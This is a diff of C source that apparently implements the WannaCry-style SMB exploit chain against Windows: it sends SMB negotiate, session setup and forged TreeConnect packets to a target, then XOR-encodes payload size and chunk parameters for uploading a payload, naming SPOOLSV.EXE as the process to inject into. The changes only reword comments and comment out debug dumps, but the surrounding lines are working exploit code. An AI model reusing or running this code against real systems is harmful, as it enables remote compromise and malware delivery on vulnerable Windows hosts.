@@ -428,16 +428,18 @@ int main(int argc, char* argv[])
 	send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
-	//send Session Setup AndX request
+	//send SMB Session Setup AndX request
 	printf("sending Session_Setup_AndX_Request!\n");
 	ret = send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
 	//copy our returned userID value from the previous packet to the TreeConnect request packet
-	userid = *(WORD*)(recvbuff + 0x20);       //get userid
+	userid = *(WORD*)(recvbuff + 0x20);
 
-	//Generates a dynamic TreeConnect request with the correct IP address
-	//rather than the hard coded one embedded in the TreeConnect string
+	/*
+	Generates a dynamic TreeConnect request with the correct IP address
+	rather than a hard coded IP address like the one embedded in the Wannacry TreeConnect packet
+	*/
 	unsigned char packet[4096];
 	unsigned char* ptr;
 	unsigned char tmp[1024];
@@ -458,13 +460,13 @@ int main(int argc, char* argv[])
 	memcpy(packet + 3, &smblen, 1);
 
 	//update UserID in modified TreeConnect Request
-	memcpy(packet + 0x20, (unsigned char*)&userid, 2); //update userid
+	memcpy(packet + 0x20, (unsigned char*)&userid, 2);
 
 	//send modified TreeConnect request
 	send(sock, (char*)packet, ptr - packet, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
-	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid
+	treeid = *(WORD*)(recvbuff + 0x1c);
 
 	//TreeConnect_Response treeresponse;
 	//memcpy(&treeresponse, recvbuff, sizeof(TreeConnect_Response));
@@ -701,14 +703,14 @@ int main(int argc, char* argv[])
 		memcpy(smb_params->parameters, (unsigned char*)&TotalSizeOfPayload, 4);
 		memcpy(smb_params->parameters + 4, (unsigned char*)&ChunkSize, 4);
 		memcpy(smb_params->parameters + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
-		hexDump(0, smb_params->parameters, 12);
+		//hexDump(0, smb_params->parameters, 12);
 		int i;
 
 		for (i = 0; i < 12; i++)
 		{
 			smb_params->parameters[i] ^= byte_xor_key[i % 4];
 		}
-		hexDump(0, smb_params->parameters, 12);
+		//hexDump(0, smb_params->parameters, 12);
 
 		unsigned char hMem[4096];
 		const char* proc_name = "SPOOLSV.EXE";
